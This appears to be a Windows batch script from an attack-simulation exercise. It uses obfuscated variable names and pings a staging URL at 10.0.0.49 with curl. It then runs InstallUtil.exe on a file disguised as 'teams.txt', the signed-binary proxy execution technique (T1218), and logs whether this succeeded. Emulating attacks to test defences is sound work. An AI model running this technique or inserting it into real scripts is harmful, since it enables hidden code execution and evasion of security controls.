@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET tsvar=!DATE! !TIME!
SET pjkcpgw=%APPDATA%\9762\63e04480
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9762-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=teams.txt
SET ewjmdkff=9762
SET yhdfkp=%APPDATA%\!pudaazx!\macula-simulations.log

echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_start>> "!yhdfkp!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_complete>> "!yhdfkp!" 2>nul

echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_start>> "!yhdfkp!" 2>nul
cd /d "!pjkcpgw!" >nul 2>&1
SET jhrvkp=!errorlevel!
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_result=!jhrvkp!>> "!yhdfkp!" 2>nul

echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: t1218_start>> "!yhdfkp!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "!syjfr!" >NUL 2>&1
SET uyxmcp=!errorlevel!
SET opkreb=
if !uyxmcp! equ 0 (
 SET ydrtek=1
) else (
 SET ydrtek=0
 SET opkreb=execution_failed
)
echo [!tsvar!][TTP][!hlbnp!][!ewjmdkff!]: T1218|Signed Binary Proxy Execution: InstallUtil=!ydrtek!:!opkreb!>> "!yhdfkp!" 2>nul
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: t1218_result=!uyxmcp!>> "!yhdfkp!" 2>nul